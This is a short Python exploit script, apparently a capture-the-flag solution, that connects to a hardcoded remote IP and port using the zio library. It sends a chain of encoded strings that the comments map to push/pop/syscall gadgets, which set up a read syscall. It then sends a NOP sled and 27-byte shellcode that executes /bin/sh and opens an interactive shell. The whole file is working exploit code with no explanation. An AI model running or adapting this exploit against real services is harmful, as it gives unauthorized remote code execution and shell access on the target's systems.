#!/usr/bin/env python
# -*- coding: utf-8 -*-
from zio import *

ip = '210.61.2.51'
#ip = '10.211.55.48'
port = 5566

io = zio((ip, port), timeout = 1000, print_write = COLORED(REPR))
io.write(l32(0x7))

# some gadgets
# asm                           |   hex(+ jmp to the next block)
# push rbx                      |  53    + 0xeb11
# pop  rax syscall(read)        |  58    + 0xeb11
# push rbx                      |  53    + 0xeb11
# pop  rdi fd 0                 |  5f    + 0xeb11
# push rdx len(0x604f00)        |  52    + 0xeb11
# pop  rsi address(0x604f00)    |  5e    + 0xeb11
# syscall read(0, &code, len)   |  0f05

payload = ""
payload += "_mWHdMZcaKI54Gt3" # push rbx
payload += "qSJH75Q1mWzrIaDe" # pop  rax
payload += "_mWHdMZcaKI54Gt3" # push rbx
payload += "jI8cZSWzZXpt_gZY" # pop  rdi
payload += "WUHRp5mV3lh4eEJj" # push rdx
payload += "1biV3QuKIIVxpzi4" # pop  rsi
payload += "lHachSyd4zC5Uyp5" # syscall

io.write(payload)

# shellcode Execute /bin/sh - 27 bytes
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91"+\
		"\xd0\x8c\x97\xff\x48\xf7\xdb\x53"+\
		"\x54\x5f\x99\x52\x57\x54\x5e\xb0"+\
		"\x3b\x0f\x05"

io.write('\x90'*1000 + shellcode)
io.interact()
